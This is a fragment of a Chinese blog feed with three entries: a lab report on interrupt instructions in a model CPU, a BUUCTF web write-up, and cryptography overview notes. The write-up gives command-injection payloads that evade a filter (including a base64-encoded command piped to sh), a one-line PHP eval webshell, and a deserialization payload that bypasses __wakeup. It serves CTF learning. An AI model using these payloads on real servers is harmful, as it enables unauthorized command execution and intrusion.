XXXXXXXX XXXXXXXX*</strong></em></td><td><em><strong>*[addr]→I/O奇字节*</strong></em></td></tr><tr><td><em><strong>*JMP addr*</strong></em></td><td><em><strong>*10110000 XXXXXXXX XXXXXXXX*</strong></em></td><td><em><strong>*addr→PC*</strong></em></td></tr></tbody></table><p><strong>程序清单</strong></p><table><thead><tr><th><em><strong>*地址*</strong></em></th><th><em><strong>*指令代码*</strong></em></th><th><em><strong>*助记符*</strong></em></th><th><em><strong>*功能*</strong></em></th></tr></thead><tbody><tr><td><em><strong>*000*</strong></em></td><td><em><strong>*c0*</strong></em></td><td><em><strong>*setb ea*</strong></em></td><td><em><strong>*开中断*</strong></em></td></tr><tr><td><em><strong>*001*</strong></em></td><td><em><strong>*20*</strong></em></td><td><em><strong>*in r0,ioL*</strong></em></td><td><em><strong>*i/o（数据开关）偶字节→r0*</strong></em></td></tr><tr><td><em><strong>*002*</strong></em></td><td><em><strong>*50 60 02*</strong></em></td><td><em><strong>*add r0,[addr]*</strong></em></td><td><em><strong>*r0+（addr）→R0*</strong></em></td></tr><tr><td><em><strong>*005*</strong></em></td><td><em><strong>*70 61 02*</strong></em></td><td><em><strong>*sta [addr],r0*</strong></em></td><td><em><strong>*R0→(addr)*</strong></em></td></tr><tr><td><em><strong>*008*</strong></em></td><td><em><strong>*90 61 02*</strong></em></td><td><em><strong>*out [addr],ioH*</strong></em></td><td><em><strong>*[addr]→i/o(奇字节)*</strong></em></td></tr><tr><td><em><strong>*00B*</strong></em></td><td><em><strong>*b0 01 00*</strong></em></td><td><em><strong>*jmp 001h*</strong></em></td><td><em><strong>*[addr]→pc*</strong></em></td></tr><tr><td><em><strong>*……*</strong></em></td><td><em><strong>*……*</strong></em></td><td><em><strong>*……*</strong></em></td><td><em><strong>*……*</strong></em></td></tr><tr><td><em><strong>*010*</strong></em></td><td><em><strong>*20*</strong></em></td><td><em><strong>*stb r0,ioL*</strong></em></td><td><em><strong>*i/o（数据开关）偶字节→r0*</strong></em></td></tr><tr><td><em><strong>*011*</strong></em></td><td><em><strong>*70 60 02*</strong></em></td><td><em><strong>*sta [addr],r0*</strong></em></td><td><em><strong>*r1→(addr)*</strong></em></td></tr><tr><td><em><strong>*014*</strong></em></td><td><em><strong>*e0*</strong></em></td><td><em><strong>*ret*</strong></em></td><td><em><strong>*[sp]→pc,sp+2*</strong></em></td></tr></tbody></table><p><strong>4.</strong> <strong>实验原理</strong></p><p>本实验的机器指令格式在分段模型机（高三位）的基础上增加流水识别位（第四位），该位为“0”时定义非流水指令，该位为“1”时表示需要寻址流水子过程。</p><p>在流水模型机的基础上，增加与中断有关的3条指令</p><table><thead><tr><th><em><strong>*助记符*</strong></em></th><th><em><strong>*机器指令码*</strong></em></th><th><em><strong>*说明*</strong></em></th></tr></thead><tbody><tr><td><em><strong>*SETB EA*</strong></em></td><td><em><strong>*11000000*</strong></em></td><td><em><strong>*中断允许*</strong></em></td></tr><tr><td><em><strong>*CLR EA*</strong></em></td><td><em><strong>*00000000*</strong></em></td><td><em><strong>*中断禁止*</strong></em></td></tr><tr><td><em><strong>*RET*</strong></em></td><td><em><strong>*11100000*</strong></em></td><td><em><strong>*返回或从中断返回*</strong></em></td></tr></tbody></table><p>与中断有关的为控制格式</p><p>中断允许控制IEQ</p><table><thead><tr><th>M7</th><th>M6</th><th>M3</th><th>M0</th><th>节拍</th><th></th><th></th></tr></thead><tbody><tr><td>Op</td><td>W</td><td>Ie</td><td>Ids</td><td>T4</td><td></td><td></td></tr><tr><td>1</td><td>1</td><td>0</td><td>1</td><td>↑</td><td>1→IEQ</td><td>开中断</td></tr><tr><td>1</td><td>0</td><td>0</td><td>1</td><td>↑</td><td>0→IEQ</td><td>关中断</td></tr></tbody></table><p>中断响应控制IAQ</p><table><thead><tr><th>M7</th><th>M6</th><th>M3</th><th>M0</th><th>节拍</th><th></th><th></th></tr></thead><tbody><tr><td>Op</td><td>W</td><td>Ie</td><td>Ids</td><td>T4</td><td></td><td></td></tr><tr><td>0</td><td>1</td><td>0</td><td>1</td><td>↑</td><td>1→IAQ</td><td>中断响应</td></tr><tr><td>0</td><td>0</td><td>0</td><td>1</td><td>↑</td><td>0→IAQ</td><td>中断退出</td></tr></tbody></table><p>中断请求控制INQ</p><table><thead><tr><th>IEQ</th><th>IAQ</th><th>INT</th><th>T4</th><th></th><th></th></tr></thead><tbody><tr><td>1</td><td>0</td><td>0</td><td>↑</td><td>1→INQ</td><td>锁存请求</td></tr><tr><td>X</td><td>1</td><td>X</td><td>↑</td><td>0→IAQ</td><td>清除请求</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA0E1.tmp.jpg" alt="img"> </p><p><strong>(<strong><strong>中断电源原理图</strong></strong>)</strong></p><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA0E2.tmp.jpg" alt="img"></p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA0E3.tmp.png" alt="img"></td></tr></tbody></table><p><strong>5</strong><strong>. 实验步骤</strong></p><p>打开CMStudio程序找道mxj8.asm装载</p><p>中断模型机源程序:</p><p>#LOAD “MXJ5.IS”     ;预调入指令系统/微程序</p><p>#SET RAM 0260h = 5500h  ;数据区0260H单元预置数据5500h</p><p>​    org  0</p><p>start:  setb  ea     ;开中断</p><p>loop:  in   r0, iol</p><p>​    add  r0, 0260h</p><p>​    sta  0261h, r0</p><p>​    out  ioh, 0261h</p><p>​    jmp  loop</p><p>​    org  10h    ;中断服务程序</p><p>​    in   r0, iol</p><p>​    sta  0260h, r0</p><p>​    ret</p><p>​    end</p><p><strong>6．实验心得</strong></p><p>最后一次实验，实验内容为中断控制，到这里我们是以软件模拟微程序进行实验，通过这个实验对中断控制的了解更加深入。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuCTF之web题目wp</title>
      <link href="/2022/01/23/buuCTF%E4%B9%8Bweb%E9%A2%98%E7%9B%AEwp/"/>
      <url>/2022/01/23/buuCTF%E4%B9%8Bweb%E9%A2%98%E7%9B%AEwp/</url>
      
        <content type="html"><![CDATA[<h2 id="1Ping-Ping-Ping"><a href="#1Ping-Ping-Ping" class="headerlink" title="1Ping Ping Ping"></a>1Ping Ping Ping</h2><p>进入环境提示/?ip=，就传一个?ip=127.0.0.1有回显结果, 这是经典的Linux命令执行，使用命令执行的管道符 “|” 执行ls命令列出文件，可以看到题目中含有index.php和flag.php   </p><p>直接访问flag.php是没有任何显示的。接着用上一步的类似方法 cat flag.php回显为 fxck your space! 空格被过滤了。然后尝试绕过空格 构造ployld</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?ip&#x3D;1|&#123;cat,flag.php&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回显为 fxck your symbol! ，这是，也被过滤了吧…..以 $IFS$1 的形式也可以代替空格。再次尝试。 </p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?ip&#x3D;1|cat$IFS$1flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这次回显是 fxck your flag!    这是flag也被过滤了…..尝试用相同方式访问index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php文件真实过滤了不少东西啊……</p> <pre class="line-numbers language-none"><code class="language-none">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就避免了被过滤掉，flag在注释里面。</p><p>这个题目还过滤了bash，也提供了一种解决的思路。</p><pre class="line-numbers language-none"><code class="language-none">？ip&#x3D;1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在后面看大佬博客的时候，发现这道题目也可以实现内联执行，使用 `` 代替 | ，将反引号内命令的输出作为输入执行?  </p><pre class="line-numbers language-none"><code class="language-none">?ip&#x3D;1;cat$IFS$1&#96;ls&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-Knife"><a href="#2-Knife" class="headerlink" title="2 Knife"></a>2 <strong>Knife</strong></h2><p>我家菜刀丢了，你能帮我找一下么eval($_POST[“Syc”]);</p><p>提示很明显，有一个菜刀，还有一句话木马也挂上了..需要做的就是把蚁剑连上去就行，flag在最外层目录下面。</p><h2 id="3-极客大挑战-2019-PHP"><a href="#3-极客大挑战-2019-PHP" class="headerlink" title="3 [极客大挑战 2019]PHP"></a>3 [极客大挑战 2019]PHP</h2><p>这个题让我反思，现在一直用的原版的程序他爆破的文件是不是要更新下……我不知道别人是怎么跑出来的<a href="http://www.zip这个压缩文件,我这包里直接没有,可以通过访问www.zip下载到这个网站的备份,里面有个flag.php的文件那个是假的./">www.zip这个压缩文件，我这包里直接没有，可以通过访问www.zip下载到这个网站的备份，里面有个flag.php的文件那个是假的。</a></p><p>在index.php里面有这样一段， 加载了一个class.php文件，然后采用get传递一个select参数，随后将之反序列化 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>   <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化的内容，之前省赛的视频里讲过，不过我确实没怎么学好，查看class.php中的内容，可以知道，如果password=100，username=admin，在执行__destruct()的时候可以获得flag，所以我们需要达成这些要求 </p><p>这时候可以写一个序列化脚本来构造序列化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在反序列化的时候会首先执行<code>__wakeup()</code>方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过<code>__wakeup()</code>，而去执行<code>__destruct</code></p><p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p><p> private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度 </p><blockquote><p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p></blockquote><p><img src="D:\gitee-blog\source_posts\buuCTF之web题目wp\1642943121450.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学概述</title>
      <link href="/2022/01/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A61/"/>
      <url>/2022/01/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A61/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学概述"><a href="#密码学概述" class="headerlink" title="密码学概述"></a>密码学概述</h2><h3 id="信息安全与密码技术"><a href="#信息安全与密码技术" class="headerlink" title="信息安全与密码技术"></a>信息安全与密码技术</h3><ol><li>密码技术是一门古老的技术。</li><li>信息安全服务要依赖各种安全机制来实现，而许多安全机制则需要依赖于密码技术 。</li><li>密码学贯穿于网络信息安全的整个过程，在解决信息的机密性保护、可鉴别性、完整性保护和信息抗抵赖性等方面发挥着极其重要的作用。 </li></ol><h3 id="密码技术发展简介"><a href="#密码技术发展简介" class="headerlink" title="密码技术发展简介"></a>密码技术发展简介</h3><p>根据不同时期密码技术采用的加密和解密实现手段的不同特点，密码技术的发展历史大致可以划分为三个时期，即古典密码、近代密码和现代密码时期。</p><h4 id="现代密码时期"><a href="#现代密码时期" class="headerlink" title="现代密码时期"></a>现代密码时期</h4><ul><li>1949年香农的奠基性论文“保密系统的通信理论’’的发表，首次将信息论引入密码技术的研究，用统计的观点对信源、密码源、密文进行数学描述和定量分析，引入了不确定性、多余度、唯一解距离等安全性测度概念和计算方法，为现代密码学研究与发展奠定了坚实的理论基础，把已有数千年历史的密码技术推向了科学的轨道，使密码学成为一门真正的科学。</li><li>1967年，戴维·卡恩出版了一本专著《破译者》</li><li>1977年，美国国家标准局NBS正式公布实施美国的数据加密标准DES</li><li>1976年11月，美国斯坦福大学的著名密码学家迪菲和赫尔曼发表了“密码学新方向”一文，首次提出了公钥密码体制的概念和设计思想，开辟了公开密钥密码学的新领域，掀起了公钥密码研究的序幕。</li><li>1997年4月美国国家标准和技术研究所发起征集高级数据加密标准算法的活动。</li><li>2000年10月，比利时密码学家Joan Daemen和Vincent Rijmen 提出的“Rijndael数据加密算法”被确定为AES算法，作为新一代数据加密标准。</li><li>二十世纪末的AES算法征集活动使密码学界又掀起了一次分组密码研究的高潮。同时，在公钥密码领域，椭圆曲线密码体制由于其安全性高、计算速度快等优点引起了人们的普遍关注和研究，并在公钥密码技术中取得重大进展。</li></ul><h3 id="密码学基本概念"><a href="#密码学基本概念" class="headerlink" title="密码学基本概念"></a>密码学基本概念</h3><h4 id="密码学的主要任务"><a href="#密码学的主要任务" class="headerlink" title="密码学的主要任务"></a>密码学的主要任务</h4><p>在信息安全的诸多涉及面中，密码学主要为存储和传输中的数字信息提供如下几个方面的安全保护： </p><p><strong>机密性：</strong>是一种允许特定用户访问和阅读信息，而非授权用户对信息内容不可理解的安全属性。指保证信息不被非授权访问。</p><p><strong>完整性：</strong>数据完整性即用以确保数据在存储和传输过程中不被非授权修改的的安全属性。密码学可通过采用数据加密、报文鉴别或数字签名等技术来实现数据的完整性保护。 </p><p><strong>鉴别：</strong>这是一种与数据来源和身份鉴别有关的安全服务。鉴别服务包括对身份的鉴别和对数据源的鉴别。对于一次通信，必须确信通信的对端是预期的实体，这就涉及到身份的鉴别。对于数据，仍然希望每一个数据单元发送到或来源于预期的实体，这就是数据源鉴别。数据源鉴别隐含地提供数据完整性服务。</p><p><strong>抗抵赖性：</strong>是一种用于阻止通信实体抵赖先前的通信行为及相关内容的安全特性。密码学通过对称加密或非对称加密，以及数字签名等技术，并借助可信机构或证书机构的辅助来提供这种服务。也称作抗否认性，是面向通信双方信息真实统一的安全要求，它包括收、发双方均不可抵赖。</p><h4 id="密码学研究领域的两个分支："><a href="#密码学研究领域的两个分支：" class="headerlink" title="密码学研究领域的两个分支："></a>密码学研究领域的两个分支：</h4><ol><li>密码编码学（Cryptography） 密码编码学的主要任务是寻求有效密码算法和协议，以保证信息的机密性或认证性的方法。它主要研究密码算法的构造与设计，也就是密码体制的构造。它是密码理论的基础，也是保密系统设计的基础。</li><li>密码分析学（Cryptanalytics）密码分析学的主要任务是研究加密信息的破译或认证信息的伪造。它主要是对密码信息的解析方法进行研究。密码编码学和密码分析学是密码学的两个方面，两者既相互对立，又互相促进和发展。</li></ol><h4 id="密码系统的概念"><a href="#密码系统的概念" class="headerlink" title="密码系统的概念"></a>密码系统的概念</h4><p>​    密码技术的一个基本功能是实现保密通信，经典的保密通信模型</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/01/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A61/1.png"></p><h4 id="几个基本概念与符号"><a href="#几个基本概念与符号" class="headerlink" title="几个基本概念与符号"></a>几个基本概念与符号</h4><ul><li><p>明文（Plaintext）待伪装或加密的消息（Message）。在通信系统中它可能是比特流，如文本、位图、数字化的语音流或数字化的视频图像等 。一般可以简单的认为明文是有意义的字符或比特集，或通过某种公开的编码标准就能获得的消息。明文常用m或p表示。</p></li><li><p>密文(Ciphertext)对明文施加某种伪装或变换后的输出，也可认为是不可直接理解的字符或比特集，密文常用c表示。</p></li><li><p>加密(Encrypt)把原始的信息（明文）转换为密文的信息变换过程。</p></li><li><p>解密(Decrypt)把己加密的信息（密文）恢复成原始信息明文的过程，也称为脱密。</p></li></ul><h4 id="密码算法-Cryptography-Algorithm"><a href="#密码算法-Cryptography-Algorithm" class="headerlink" title="密码算法(Cryptography Algorithm)"></a>密码算法(Cryptography Algorithm)</h4><p>也简称密码（Cipher），通常是指加、解密过程所使用的信息变换规则，是用于信息加密和解密的数学函数。<br>对明文进行加密时所采用的规则称作加密算法，而对密文进行解密时所采用的规则称作解密算法。加密算法和解密算法的操作通常都是在一组密钥的控制下进行的。<br>密钥（Secret Key ）<br>用于加密算法的叫做加密密钥，用于解密算法的叫做解密密钥，加密密钥和解密密钥可能相同，也可能不相同。<br>密钥常用k表示。在密钥k的作用下，加密变换通常记为Ek(·)，解密变换记为Dk(·)或Ek－1(·)。</p><p>通常一个密码体制可以有如下几个部分： </p><pre class="line-numbers language-none"><code class="language-none">消息空间M（又称明文空间）：所有可能明文m的集合；密文空间C：所有可能密文c的集合；密钥空间K：所有可能密钥k的集合，其中每一密钥k由加密密钥ke和解密密钥kd组成，即k＝（ke，kd）；加密算法E：一簇由加密密钥控制的、从M到C的加密变换；解密算法D: 一簇由解密密钥控制的、从C到M的解密变换。五元组&#123; M，C，K，E，D &#125;就称为一个密码系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于明文空间M中的每一个明文m，加密算法E在加密密钥ke的控制下将明文m加密成密文c；而解密算法D则在密钥kd的控制下将密文c解密成同一明文m，即：对m∈M，(ke，kd)∈K，有： <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1642411497542.png" alt="1642411497542" style="zoom: 33%;" /></p><p>数据安全基于密钥而不是算法的保密。也就是说，对于一个密码体制，其算法是可以公开的，让所有人来使用、研究。但具体对于某次加密过程中所使用的密钥，则是保密的。</p><h4 id="对密码系统的攻击"><a href="#对密码系统的攻击" class="headerlink" title="对密码系统的攻击"></a>对密码系统的攻击</h4><p>密码攻击：在信息传输和处理系统中，除了合法的接收者外，还有“黑客”，他们试图努力从截获的密文中推断出原来的明文，这一过程称为密码攻击（密码分析）。<br>密码分析在外交、军事、公安、商业等方面都具有重要作用，也是研究历史、考古、古语言学和古乐理论的重要手段之一。<br>密码分析者破译或攻击密码的方法主要有穷举攻击法、统计分析法和数学分析攻击法。<br>密码分析除了依靠数学、工程背景、语言学等知识外，还要靠经验、统计、测试、眼力、直觉判断能力……，有时还靠点运气</p><ul><li>穷举攻击法</li></ul><p>​    穷举攻击法又称为强力或蛮力攻击。这种攻击方法是对截获到的密文尝试遍历所有可能的密钥，直到获得了一种从密文到明文的可理解的转换；或使用不变的密钥对所有可能的明文加密直到得到与截获到的密文一致为止。<br>​     只要有足够多的计算时间和存储容量，原则上穷举法总是可以成功的。实际上，任何一种能保障安全要求的实用密码都会设计得使这一方法在实际上是不可行的。</p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/01/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A61/2.png"></p><ul><li>统计分析法</li></ul><p>​      利用明文的已知统计规律进行破译的方法。密码破译者对截收的密文进行统计分析，总结出其间的统计规律，并与明文的统计规律进行对照比较，从中提取出明文和密文之间的对应或变换信息</p><ul><li>数学分析法</li></ul><p>利用一个或几个已知量(比如，已知密文或明文-密文对)用数学关系式表示出所求未知量(如密钥等)。已知量和未知量的关系视加密和解密算法而定，寻求这种关系是确定性分析法的关键步骤。</p><p>在假设密码分析者已知所用加密算法全部知识的情况下，根据密码分析者对明文、密文等数据资源的掌握程度，可以将针对加密系统的密码分析攻击类型分为以下四种：</p><table><thead><tr><th><strong>攻击类型</strong></th><th align="left"><strong>攻击者拥有的资源</strong></th></tr></thead><tbody><tr><td><strong>惟密文攻击</strong></td><td align="left"><strong>加密算法 , 截获的部分密文</strong></td></tr><tr><td><strong>已知明文攻击</strong></td><td align="left">**加密算法, ** <strong>截获的部分密文和相应的明文</strong></td></tr><tr><td><strong>选择明文攻击</strong></td><td align="left"><strong>加密算法,</strong> <strong>加密黑盒子，可加密任意明文得到相应的密文</strong></td></tr><tr><td><strong>选择密文攻击</strong></td><td align="left">**加密算法 ** <strong>解密黑盒子，可解密任意密文得到相应的明文</strong></td></tr></tbody></table><p>① 惟密文攻击（Ciphtext-only attack）<br>  密码分析者有一些消息的密文，这些消息都用同一加密算法加密，密码分析者知道密码算法。密码分析者的任务是恢复尽可能多的明文，或者最好是能推算出加密消息的密钥来，以便可采用相同的密钥解出其他被加密的消息。</p><p>  已知：C1=EK（P1），C2=EK（P2），…，<br>                Ci=EK（Pi）<br> 要推出：P1，P2， … ，Pi；k或者找出一个算法从 Ci+1= EK（Pi+1）推出Pi+1。</p><p>②已知明文攻击（Plaintext-known attack）<br>  密码分析者不仅可得到一些消息的密文，而且也知道这些消息的明文。分析者的任务就是用加密信息推出用来加密的密钥或导出一个算法，此算法可以对用同一密钥加密的任何新的消息进行解密。</p><p>  已知：P1，C1=Ek（P1），P2，C2=Ek（P2），<br>     …，Pi，Ci=Ek（Pi）.<br>  推导出：密钥k，或从Ci+1= Ek（Pi+1）推出Pi+1的算法。</p><p>③ 选择明文攻击（Chosen-plaintext attack）<br>      分析者不仅可得到一些消息的密文和相应的明文，而且他们也可选择被加密的明文。这比已知明文攻击更有效。因为密码分析者能选择特定的明文块去加密，那些块可能产生更多关于密钥的信息，分析者的任务是推出用来加密消息的密钥或导出一个算法，此算法可以对用同一密钥加密的任何新消息进行解密。</p><p>  已知：P1，C1=Ek（P1），P2，C2=Ek（P2），<br>     …，Pi，Ci=Ek（Pi）<br>    其中P1，P2 … ，Pi是由密码分析者选择的。<br>  推导出：密钥k，或从Ci+1= Ek（Pi+1）推出Pi+1的算法</p><p>④ 选择密文攻击(Chosen—ciphenext attack)<br>     选择密文攻击是指密码分析者可以选择一些密文，并得到相应的明文。密码分析者的任务目标是推出密钥。这种密码分析多用于攻击公钥密码体制。</p><p>衡量密码系统攻击的复杂性主要考虑三个方面的因素：<br> 数据复杂性：用做密码攻击所需要输入的数据量；<br> 处理复杂性：完成攻击所需要花费的时间；<br> 存储需求：进行攻击所需要的数据存储空间大小。<br>        攻击的复杂性取决于以上三个因素的最小复杂度，在实际实施攻击时往往要考虑这三种复杂性的折衷，如存储需求越大，攻击可能越快。 </p><h4 id="密码系统的安全性"><a href="#密码系统的安全性" class="headerlink" title="密码系统的安全性"></a>密码系统的安全性</h4><p>一个密码系统的安全性主要与两个方面的因素有关。</p><ol><li>一个是所使用密码算法本身的保密强度。密码算法的保密强度取决于密码设计水平、破译技术等。可以说一个密码系统所使用密码算法的保密强度是该系统安全性的技术保证。</li><li>另外一个方面就是密码算法之外的不安全因素。<br>因此，密码算法的保密强度并不等价于密码系统整体的安全性。—个密码系统必须同时完善技术与管理要求，才能保证整个密码系统的安全。</li></ol><h5 id="评估密码系统安全性主要有三种方法："><a href="#评估密码系统安全性主要有三种方法：" class="headerlink" title="评估密码系统安全性主要有三种方法："></a>评估密码系统安全性主要有三种方法：</h5><ul><li>无条件安全性 , 这种评价方法考虑的是假定攻击者拥有无限的计算资源，但仍然无法破译该密码系统。 </li><li>计算安全性 , 这种方法是指使用目前最好的方法攻破它所需要的计算远远超出攻击者的计算资源水平，则可以定义这个密码体制是安全的。</li><li>可证明安全性 ,这种方法是将密码系统的安全性归结为某个经过深入研究的数学难题（如大整数素因子分解、计算离散对数等），数学难题被证明求解困难。这种评估方法存在的问题是它只说明了这个密码方法的安全性与某个困难问题相关，没有完全证明问题本身的安全性，并给出它们的等价性证明。</li></ul><p> 对于实际应用中的密码系统而言，由于至少存在一种破译方法，即强力攻击法，因此都不能满足无条件安全性，只提供计算安全性。<br>         